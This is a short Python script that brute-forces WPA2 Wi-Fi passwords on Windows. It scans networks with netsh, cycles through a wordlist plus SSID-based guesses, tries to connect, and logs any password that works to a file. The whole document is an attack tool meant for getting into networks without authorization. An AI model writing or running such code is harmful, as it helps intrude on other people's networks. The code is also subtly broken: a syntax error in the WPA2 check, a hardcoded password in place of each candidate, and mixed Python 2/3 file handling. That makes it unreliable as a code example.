# -*- coding:utf-8 -*-
import os
import time
cmd = r'netsh wlan show networks'
raw_info = os.popen(cmd).read()
#print raw_info
ssids = raw_info.split('\n\n')
ssids = [s for s in ssids if s]
print(ssids[0])
for ssid in ssids[1:]:
    details = ssid.split('\n')
    ssid_name,ssid_type = details[0].split(':')[-1].replace(' ',''),details[2].split(':')[-1].replace(' ','')
    
    if ssid_type.find('WPA2')>-1 ':#wpa2-psk
        print('=========[%s][%s]========='%(ssid_name,ssid_type))
        print('trying...')
        found = False
        xml_template =r'./wpa2-psk_template.xml'
        with open(xml_template) as f:
            template_str  = f.read()
        dicts = []
        with open(r'./dicts/dict.txt') as f:
            dicts = f.read().split('\n')
        dicts.append(ssid_name +'_123321')
        dicts.append(ssid_name +'_123456')
        dicts.append(ssid_name +'_111111')
        for passwd in dicts:
            if len(passwd)<6:
                #passwd = ssid_name + '_'+passwd
                continue
            temp_xml = r'./tmp.xml'

            with open(temp_xml,'wb') as f_out:
                f_out.write(template_str%(ssid_name,ssid_name,'127121XX'))
                
            add_cmd = r'netsh wlan add profile filename="%s"'%(temp_xml,)
            #print(os.popen(add_cmd).read())
            os.popen(add_cmd)
            conn_cmd = r'netsh wlan connect name="%s"'%(ssid_name,)
            #print(os.popen(conn_cmd).read())
            os.popen(conn_cmd)
            time.sleep(3)
            test = os.popen('ping www.baidu.com').read()
            #print test
            if test.find('TTL')>-1:
                print( 'get it:%s'%(passwd,))
                with open(r'./wifi_pass.txt','ab') as f:
                    f.write(ssid_name+':'+passwd+'\r\n')
                found =True        
                break
        if not found:
            print('time out. sorry failed to try out the passwd')
    else:
        continue
